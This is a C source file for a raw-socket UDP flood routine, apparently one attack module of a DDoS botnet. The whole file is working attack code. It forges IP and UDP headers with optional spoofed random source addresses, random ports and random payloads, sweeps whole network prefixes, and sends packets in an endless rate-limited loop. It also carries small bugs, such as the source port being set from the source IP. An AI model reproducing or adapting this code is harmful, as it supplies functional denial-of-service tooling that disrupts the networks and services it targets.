#define _GNU_SOURCE

#include "../../attack.h"

void flood_udpraw(struct flood *flood)
{
        int i, fd;
    char **pkts = calloc(flood->num_of_targets, sizeof(char *));


    if ((fd = sys_socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        debug("Failed to create raw socket. Aborting attack\n");
        return;
    }
    i = 1;
    if (sys_setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        debug("Failed to set IP_HDRINCL. Aborting\n");
        sys_close(fd);
        return;
    }

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);

        iph->version_ihl = (4 << 4) | 5;
        iph->tos = flood->settings->tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length);
        iph->id = htons(flood->settings->ident);
        iph->ttl = flood->settings->ttl;
        if (flood->settings->dont_fragment)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = flood->settings->source_ip;
        iph->daddr = flood->targets[i].addr;

        udph->source = htons(flood->settings->source_ip);
        udph->dest = htons(flood->settings->dest_port);
        udph->len = htons(sizeof(struct udphdr) + flood->settings->length);
    }

    struct pps_limiter pps_limit;
    pps_limit_init(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);

    while (*flood->running)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);
            
            // Use local copy of target to avoid race conditions
            struct flood_target target = flood->targets[i];

            // For prefix attacks
            if (target.netmask < 32)
                iph->daddr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            if (flood->settings->source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (flood->settings->ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (flood->settings->source_port == 0xffff)
                udph->source = rand_next();
            if (flood->settings->dest_port == 0xffff)
                udph->dest = rand_next();

            // Randomize packet content?
            uint32_t actual_len = flood->settings->length;
            if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                actual_len = rand_next_range(flood->settings->min_length, flood->settings->max_length);

            if (flood->settings->random_data)
                rand_str(data, actual_len);

            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + actual_len);
            udph->len = htons(sizeof(struct udphdr) + actual_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp((uint8_t *)udph, sizeof(struct udphdr) + flood->settings->length, (uint8_t *)&iph->saddr, (uint8_t *)&iph->daddr);

            target.sock_addr.sin_port = udph->dest;
            sys_sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + actual_len, MSG_NOSIGNAL, (void *)&target.sock_addr, sizeof(struct sockaddr_in));
            
            pps_limit_wait(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }
}
